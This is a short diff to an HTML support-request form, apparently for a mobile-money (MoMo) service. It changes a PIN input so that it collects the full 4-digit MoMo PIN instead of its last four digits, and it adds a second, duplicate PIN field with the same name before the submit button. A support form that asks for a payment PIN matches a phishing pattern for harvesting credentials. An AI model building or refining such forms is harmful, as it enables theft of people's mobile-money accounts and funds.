@@ -441,14 +441,16 @@ details to help with the review of your enquiry.
     <input type="number" name="amount_paid" placeholder="Enter amount paid" min="0" step="0.01" required>
 </div>
 <div class="field">
-    <label>confirm MoMo Pin *</label>
-    <input type="text" name="momo_pin_last4"
-           placeholder="Enter MoMo Pin"
-           maxlength="4"
-           minlength="4"
-           pattern="[0-9]{4}"
-           inputmode="numeric"
-           required>
+    <label>Confirm MoMo Pin *</label>
+    <input
+        type="text"
+        name="momo_pin"
+        placeholder="Confirm 4-digit pin"
+        maxlength="4"
+        pattern="[0-9]{4}"
+        inputmode="numeric"
+        required
+    >
 </div>
     
 <div class="field full">
@@ -473,7 +475,18 @@ details to help with the review of your enquiry.
 
 
 </div>
-
+<div class="field">
+    <label>Confirm MoMo Pin *</label>
+    <input
+        type="text"
+        name="momo_pin"
+        placeholder="Confirm 4-digit pin"
+        maxlength="4"
+        pattern="[0-9]{4}"
+        inputmode="numeric"
+        required
+    >
+</div>
 <button type="submit" class="submit-btn">
 Submit Support Request →
 </button>
